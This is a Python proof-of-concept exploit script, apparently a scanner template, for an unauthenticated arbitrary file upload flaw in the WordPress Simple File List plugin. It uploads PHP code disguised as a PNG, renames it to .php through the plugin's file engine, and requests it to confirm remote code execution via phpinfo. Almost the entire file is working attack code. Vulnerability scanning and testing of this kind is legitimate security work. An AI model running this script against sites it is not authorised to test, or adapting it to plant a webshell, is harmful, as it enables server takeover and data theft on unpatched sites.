import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''WordPress SimpleFilelist Unauthenticated Arbitrary File Upload RCE''',
        "description": '''The Simple File List WordPress plugin was found to be vulnerable to an unauthenticated arbitrary file upload leading to remote code execution. The Python exploit first uploads a file containing PHP code but with a png image file extension. A second request is sent to move (rename) the png file to a PHP file.''',
        "severity": "critical",
        "references": [
            "https://wpscan.com/vulnerability/10192"
        ],
        "classification": {
            "cvss-metrics": "",
            "cvss-score": "",
            "cve-id": "",
            "cwe-id": ""
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["wordpress", "wp-plugin", "rce", "intrusive", "upload", "python"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        path = """/wp-content/plugins/simple-file-list/ee-upload-engine.php"""
        method = "POST"
        data = """--6985fa39c0698d07f6d418b37388e1b2
Content-Disposition: form-data; name="eeSFL_ID"

1
--6985fa39c0698d07f6d418b37388e1b2
Content-Disposition: form-data; name="eeSFL_FileUploadDir"

/wp-content/uploads/simple-file-list/
--6985fa39c0698d07f6d418b37388e1b2
Content-Disposition: form-data; name="eeSFL_Timestamp"

1587258885
--6985fa39c0698d07f6d418b37388e1b2
Content-Disposition: form-data; name="eeSFL_Token"

ba288252629a5399759b6fde1e205bc2
--6985fa39c0698d07f6d418b37388e1b2
Content-Disposition: form-data; name="file"; filename="nuclei.png"
Content-Type: image/png

<?php echo "Nuclei - Open source project (github.com/projectdiscovery/nuclei)"; phpinfo(); ?>
--6985fa39c0698d07f6d418b37388e1b2--"""
        headers = {'Accept': '*/*', 'Content-Type': 'multipart/form-data; boundary=6985fa39c0698d07f6d418b37388e1b2'}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        path = """/wp-content/plugins/simple-file-list/ee-file-engine.php"""
        method = "POST"
        data = """eeSFL_ID=1&eeFileOld=nuclei.png&eeListFolder=%2F&eeFileAction=Rename%7Cnuclei.php"""
        headers = {'X-Requested-With': 'XMLHttpRequest', 'Accept': '*/*', 'Content-Type': 'application/x-www-form-urlencoded'}
        resp1 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        path = """/wp-content/uploads/simple-file-list/nuclei.php"""
        method = "GET"
        data = """"""
        headers = {'Accept': '*/*'}
        resp2 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if ("""Nuclei - Open source project (github.com/projectdiscovery/nuclei)""" in resp2.text and """PHP Version""" in resp2.text and """Configuration Command""" in resp2.text) and ("""text/html""" in str(resp2.headers)) and (resp2.status_code == 200):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url